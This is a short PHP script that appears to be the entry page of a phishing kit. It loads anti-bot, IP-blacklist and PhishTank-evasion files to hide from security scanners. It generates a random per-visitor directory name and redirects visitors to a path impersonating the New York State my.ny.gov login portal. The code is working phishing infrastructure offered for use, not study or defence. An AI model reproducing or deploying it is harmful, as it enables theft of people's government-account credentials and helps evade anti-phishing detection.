<?php

session_start();

// ANITBOTS

include('Anti/Bot-Spox.php');
include('Anti/Bot-Crawler.php');
include('Anti/blacklist.php');
include('Anti/new.php');
include('Anti/IP-BlackList.php');
include('Anti/Dila_DZ.php');
include('BOTS/iprange.php');
include('BOTS/phishtank.php');
include('BOTS/spec.php');


$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 8);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="prepaid";
/*recurse_copy( $src, $dst ); */
header("location:".$dst."");  
header("location: my.ny.gov/index.php?login_form=True&session_Id=".md5(microtime())); 
exit;
?>
